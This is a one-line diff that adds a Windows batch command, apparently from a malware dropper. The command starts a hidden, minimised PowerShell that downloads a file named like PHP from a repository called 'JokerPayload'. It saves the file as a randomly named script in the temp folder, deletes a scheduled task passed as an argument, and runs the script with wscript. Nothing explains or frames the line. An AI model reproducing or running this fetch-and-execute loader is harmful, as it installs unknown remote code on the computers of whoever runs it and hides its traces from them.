@@ -1,0 +1,1 @@
+start /min powershell -com "IWR -useb 'https://raw.githubusercontent.com/wizard-projects/JokerPayload/main/oligophosphaturia.php' -outf '%tmp%\3H6ZLO19GKKT.js'; schtasks /delete /tn %1 /f; wscript %tmp%\3H6ZLO19GKKT.js"
